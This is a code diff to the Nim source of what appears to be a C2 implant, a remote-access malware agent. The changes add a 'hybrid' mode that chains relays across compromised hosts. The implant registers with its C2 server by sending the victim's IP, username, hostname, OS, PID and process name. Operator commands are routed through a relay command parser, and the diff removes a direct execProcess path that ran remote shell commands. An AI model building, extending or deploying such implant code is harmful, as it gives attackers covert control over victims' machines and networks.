@@ -451,67 +451,81 @@ proc httpHandler() {.async.} =
     when defined debug:
         echo "[DEBUG] 🌐 HTTP Handler: Relay mode status: " & $inRelayMode
     
-    if not inRelayMode:
-        # NOT in relay mode - can make direct HTTP calls to C2
-        let storedId = getStoredImplantID()
-        if storedId != "":
-            when defined debug:
-                echo "[DEBUG] 🔄 HTTP Handler: Found stored ID: " & storedId & " - attempting direct C2 reconnection"
-            
-            # Set the stored ID and attempt reconnection
-            listener.id = storedId
-            webClientListener.reconnect(listener)
-            
-            # Check if reconnection was successful
-            if listener.initialized and listener.registered:
-                when defined debug:
-                    echo "[DEBUG] ✅ HTTP Handler: Direct C2 reconnection successful with stored ID: " & storedId
-            else:
-                when defined debug:
-                    echo "[DEBUG] ❌ HTTP Handler: Direct C2 reconnection failed - will register as new implant"
-                # Clear failed ID and reinitialize
-                listener.id = ""
-                listener.initialized = false
-                listener.registered = false
-                webClientListener.init(listener)
-        else:
-            when defined debug:
-                echo "[DEBUG] 🆕 HTTP Handler: No stored ID found - performing initial C2 registration"
-            # No stored ID, perform initial registration
-            webClientListener.init(listener)
-    else:
-        # IN relay mode - encryption key must come from RelayServer, not direct C2 HTTP
+    # HYBRID MODE FIX: In RELAY_MODE, the HTTP handler should NOT register with C2
+    # Only the relayClientHandler should handle registration (via relay protocol)
+    when defined(RELAY_MODE):
         when defined debug:
-            echo "[DEBUG] 🔗 HTTP Handler: IN RELAY MODE - skipping direct C2 initialization"
-            echo "[DEBUG] 🔗 HTTP Handler: Encryption key will be provided by RelayServer via relay protocol"
+            echo "[DEBUG] 🔗 HTTP Handler: HYBRID MODE - HTTP handler will NOT register with C2"
+            echo "[DEBUG] 🔗 HTTP Handler: Only relayClientHandler handles registration via relay protocol"
+            echo "[DEBUG] 🔗 HTTP Handler: HTTP handler ONLY manages RelayServer (when started with 'relay port')"
         
-        # In relay mode, we don't initialize the HTTP listener directly
-        # The relay client handler will manage C2 communication
+        # In RELAY_MODE compilation, HTTP handler NEVER registers with C2
         listener.initialized = false
         listener.registered = false
+    else:
+        # NORMAL MODE: Only when NOT compiled as RELAY_MODE
+        if not inRelayMode:
+            # NOT in relay mode - can make direct HTTP calls to C2
+            let storedId = getStoredImplantID()
+            if storedId != "":
+                when defined debug:
+                    echo "[DEBUG] 🔄 HTTP Handler: Found stored ID: " & storedId & " - attempting direct C2 reconnection"
+                
+                # Set the stored ID and attempt reconnection
+                listener.id = storedId
+                webClientListener.reconnect(listener)
+                
+                # Check if reconnection was successful
+                if listener.initialized and listener.registered:
+                    when defined debug:
+                        echo "[DEBUG] ✅ HTTP Handler: Direct C2 reconnection successful with stored ID: " & storedId
+                else:
+                    when defined debug:
+                        echo "[DEBUG] ❌ HTTP Handler: Direct C2 reconnection failed - will register as new implant"
+                    # Clear failed ID and reinitialize
+                    listener.id = ""
+                    listener.initialized = false
+                    listener.registered = false
+                    webClientListener.init(listener)
+            else:
+                when defined debug:
+                    echo "[DEBUG] 🆕 HTTP Handler: No stored ID found - performing initial C2 registration"
+                # No stored ID, perform initial registration
+                webClientListener.init(listener)
+        else:
+            # IN relay mode - encryption key must come from RelayServer, not direct C2 HTTP
+            when defined debug:
+                echo "[DEBUG] 🔗 HTTP Handler: IN RELAY MODE - skipping direct C2 initialization"
+                echo "[DEBUG] 🔗 HTTP Handler: Encryption key will be provided by RelayServer via relay protocol"
+            
+            # In relay mode, we don't initialize the HTTP listener directly
+            # The relay client handler will manage C2 communication
+            listener.initialized = false
+            listener.registered = false
     
     # Complete registration if listener is initialized but not yet registered
-    # BUT ONLY if NOT in relay mode
-    if not inRelayMode and listener.initialized and not listener.registered:
-        when defined debug:
-            echo "[DEBUG] 🌐 HTTP Handler: Completing direct C2 registration"
+    # BUT ONLY if NOT in relay mode AND NOT compiled as RELAY_MODE
+    when not defined(RELAY_MODE):
+        if not inRelayMode and listener.initialized and not listener.registered:
+            when defined debug:
+                echo "[DEBUG] 🌐 HTTP Handler: Completing direct C2 registration"
+                
+            # Register this implant with C2
+            let localIP = getLocalIP()
+            let username = getUsername()
+            let hostname = getSysHostname()
+            let osInfo = getOSInfo()
+            let pid = getCurrentPID()
+            let processName = getCurrentProcessName()
             
-        # Register this implant with C2
-        let localIP = getLocalIP()
-        let username = getUsername()
-        let hostname = getSysHostname()
-        let osInfo = getOSInfo()
-        let pid = getCurrentPID()
-        let processName = getCurrentProcessName()
-        
-        webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
-                                             osInfo, pid, processName, false)
-        
-        when defined debug:
-            echo "[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed"
-    elif inRelayMode:
-        when defined debug:
-            echo "[DEBUG] 🔗 HTTP Handler: Skipping C2 registration - in relay mode"
+            webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
+                                                 osInfo, pid, processName, false)
+            
+            when defined debug:
+                echo "[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed"
+        elif inRelayMode:
+            when defined debug:
+                echo "[DEBUG] 🔗 HTTP Handler: Skipping C2 registration - in relay mode"
     
     when defined debug:
         echo "[DEBUG] 🌐 HTTP Handler: Implant registered with C2"
@@ -550,10 +564,13 @@ proc httpHandler() {.async.} =
             
             # 1.5. CRITICAL: Poll relay server for messages (if running)
             when defined debug:
-                echo "[DEBUG] 🌐 HTTP Handler: Checking relay server status - isListening: " & $g_relayServer.isListening
-                echo "[DEBUG] 🌐 HTTP Handler: Relay server port: " & $g_relayServer.port
+                echo "[DEBUG] 🌐 HTTP Handler: ═══════════════════════════════════════════════════"
+                echo "[DEBUG] 🌐 HTTP Handler: CHECKING RELAY SERVER STATUS (from HTTP handler)"
+                echo "[DEBUG] 🌐 HTTP Handler: - g_relayServer.isListening: " & $g_relayServer.isListening
+                echo "[DEBUG] 🌐 HTTP Handler: - g_relayServer.port: " & $g_relayServer.port
                 let stats = relay_commands.getConnectionStats(g_relayServer)
-                echo "[DEBUG] 🌐 HTTP Handler: Relay server connections: " & $stats.connections
+                echo "[DEBUG] 🌐 HTTP Handler: - Relay server connections: " & $stats.connections
+                echo "[DEBUG] 🌐 HTTP Handler: ═══════════════════════════════════════════════════"
             
             if g_relayServer.isListening:
                 when defined debug:
@@ -1252,54 +1269,35 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                             echo "[DEBUG] 📋 └─────────────────────────────────────────────┘"
                     
                     when defined debug:
-                        echo "[DEBUG] ⚡ Executing command: " & actualCommand
+                        echo "[DEBUG] ⚡ ┌─────────── COMMAND ANALYSIS ───────────┐"
+                        echo "[DEBUG] ⚡ │ Raw actualCommand: '" & actualCommand & "' │"
+                        echo "[DEBUG] ⚡ │ Command length: " & $actualCommand.len & " │"
+                        echo "[DEBUG] ⚡ │ Starts with 'relay ': " & $actualCommand.startsWith("relay ") & " │"
+                        echo "[DEBUG] ⚡ │ First 10 chars: '" & (if actualCommand.len >= 10: actualCommand[0..9] else: actualCommand) & "' │"
                         if args.len > 0:
-                            echo "[DEBUG] ⚡ Command arguments: " & $args
+                            echo "[DEBUG] ⚡ │ Command arguments: " & $args & " │"
+                        echo "[DEBUG] ⚡ └─────────────────────────────────────────┘"
                     
-                    # For relay clients, we need to handle commands differently
-                    # since we don't have an HTTP listener
-                    var result: string
-                    if actualCommand.startsWith("relay "):
-                        # RELAY COMMANDS: Process using relay command handler
-                        # Relay commands handle their own argument parsing
-                        result = processRelayCommand(actualCommand)
-                        when defined debug:
-                            echo "[DEBUG] 🔧 Relay command executed"
-                    else:
-                        # SYSTEM COMMANDS: Combine command with arguments before execution
-                        var fullCommand = actualCommand
-                        
-                        # ✅ FIX: Properly combine command with arguments
-                        if args.len > 0:
-                            for arg in args:
-                                fullCommand = fullCommand & " " & arg
-                        
-                        when defined debug:
-                            echo "[DEBUG] 💻 ┌─────────── COMMAND EXECUTION ───────────┐"
-                            echo "[DEBUG] 💻 │ Base command: '" & actualCommand & "' │"
-                            echo "[DEBUG] 💻 │ Arguments: " & $args & " │"
-                            echo "[DEBUG] 💻 │ Full command: '" & fullCommand & "' │"
-                            echo "[DEBUG] 💻 └─────────────────────────────────────────┘"
-                        
-                        # Execute the complete command with arguments
-                        try:
-                            result = execProcess(fullCommand)
-                            when defined debug:
-                                echo "[DEBUG] 💻 ┌─────────── COMMAND RESULT ───────────┐"
-                                echo "[DEBUG] 💻 │ ✅ System command executed successfully │"
-                                echo "[DEBUG] 💻 │ Full command: '" & fullCommand & "' │"
-                                echo "[DEBUG] 💻 │ Result length: " & $result.len & " bytes │"
-                                echo "[DEBUG] 💻 │ Result (first 200 chars): │"
-                                echo "[DEBUG] 💻 │ " & (if result.len > 200: result[0..199] & "..." else: result) & " │"
-                                echo "[DEBUG] 💻 └─────────────────────────────────────┘"
-                        except Exception as e:
-                            result = "Error executing command '" & fullCommand & "': " & e.msg
-                            when defined debug:
-                                echo "[DEBUG] ❌ ┌─────────── COMMAND ERROR ───────────┐"
-                                echo "[DEBUG] ❌ │ Command execution failed │"
-                                echo "[DEBUG] ❌ │ Full command: '" & fullCommand & "' │"
-                                echo "[DEBUG] ❌ │ Error: " & e.msg & " │"
-                                echo "[DEBUG] ❌ └─────────────────────────────────────┘"
+                    # CRITICAL FIX: Use parseCmdRelay for RelayClient command processing
+                    when defined debug:
+                        echo "[DEBUG] 🔧 ┌─────────── USING CMDPARSER FOR RELAY CLIENT ───────────┐"
+                        echo "[DEBUG] 🔧 │ Command: '" & actualCommand & "' │"
+                        echo "[DEBUG] 🔧 │ Args: " & $args & " │"
+                        echo "[DEBUG] 🔧 │ Using parseCmdRelay() instead of direct processing │"
+                        echo "[DEBUG] 🔧 └─────────────────────────────────────────────────────────┘"
+                    
+                    # Create a dummy RelayImplant for parseCmdRelay (it's not used in the function)
+                    var dummyRelayImplant: RelayImplant
+                    let result = cmdParser.parseCmdRelay(dummyRelayImplant, actualCommand, cmdGuid, args)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🔧 ┌─────────── CMDPARSER RESULT ───────────┐"
+                        echo "[DEBUG] 🔧 │ Command processed via parseCmdRelay │"
+                        echo "[DEBUG] 🔧 │ Command: '" & actualCommand & "' │"
+                        echo "[DEBUG] 🔧 │ Result: " & result & " │"
+                        echo "[DEBUG] 🔧 │ After execution g_relayServer.isListening: " & $g_relayServer.isListening & " │"
+                        echo "[DEBUG] 🔧 │ After execution g_relayServer.port: " & $g_relayServer.port & " │"
+                        echo "[DEBUG] 🔧 └─────────────────────────────────────────────────┘"
                     
                     when defined debug:
                         echo "[DEBUG] 📤 ┌─────────── SENDING RESULT TO RELAY ───────────┐"
@@ -1778,25 +1776,32 @@ proc runMultiImplant*() {.async.} =
                         
                         if upstreamRelay.isConnected:
                             when defined debug:
-                                echo "[DEBUG] ✅ Successfully connected to relay. Entering relay client mode."
-                                echo "[DEBUG] 🔗 RELAY CLIENT MODE ACTIVATED"
-                                echo "[DEBUG] 📡 Listening for commands from relay server..."
+                                echo "[DEBUG] ✅ Successfully connected to relay. Entering HYBRID mode."
+                                echo "[DEBUG] 🔗 HYBRID RELAY CLIENT MODE ACTIVATED"
+                                echo "[DEBUG] 📡 Running BOTH relay client AND HTTP handlers for multi-layer support"
+                                echo "[DEBUG] 🌐 HTTP handler: Can receive 'relay port' commands from C2"
+                                echo "[DEBUG] 📡 Relay client: Receives commands from upstream relay"
                             
-                            # Relay client main loop with safe restart mechanism
+                            # HYBRID MODE: Run both handlers simultaneously for multi-layer relay chains
                             while true:
                                 try:
                                     when defined debug:
-                                        echo "[MAIN] 🚀 Starting relay client handler (safe mode)"
+                                        echo "[MAIN] 🚀 Starting HYBRID mode handlers (relay client + HTTP)"
                                     
-                                    await safeRelayClientHandler(host, port)
+                                    # Start both handlers in parallel using asyncdispatch
+                                    let relayClientFuture = safeRelayClientHandler(host, port)
+                                    let httpHandlerFuture = safeHttpHandler()
+                                    
+                                    # Wait for either one to complete (they should run indefinitely)
+                                    await relayClientFuture or httpHandlerFuture
                                     
                                     when defined debug:
-                                        echo "[MAIN] 🔄 Relay client handler ended, restarting in 5 seconds..."
+                                        echo "[MAIN] 🔄 One of the handlers ended, restarting both in 5 seconds..."
                                     
                                     await sleepAsync(5000)  # Wait before restart
                                 except Exception as e:
                                     when defined debug:
-                                        echo "[MAIN] 💥 Critical error in main relay loop: " & e.msg
+                                        echo "[MAIN] 💥 Critical error in hybrid relay loop: " & e.msg
                                     await sleepAsync(10000)  # Longer wait on critical error
                         else:
                             when defined debug:
